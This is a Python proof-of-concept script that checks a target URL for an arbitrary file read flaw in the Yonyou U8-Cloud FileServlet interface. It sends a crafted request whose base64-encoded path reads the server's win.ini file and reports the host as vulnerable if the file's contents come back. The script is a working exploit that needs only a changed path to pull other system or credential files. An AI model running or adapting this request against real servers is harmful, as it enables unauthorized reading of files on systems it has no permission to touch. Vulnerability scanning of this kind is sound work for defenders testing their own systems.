import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友U8-Cloud接口FileServlet存在任意文件读取漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)',
        'Connection':'close'
    }
    vurl = urllib.parse.urljoin(url, "/service/~hrpub/nc.bs.hr.tools.trans.FileServlet?path=QzovL3dpbmRvd3Mvd2luLmluaQ==")
    try:
        response = requests.get(vurl, headers=headers)
        if response.status_code == 200 and '[fonts]' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult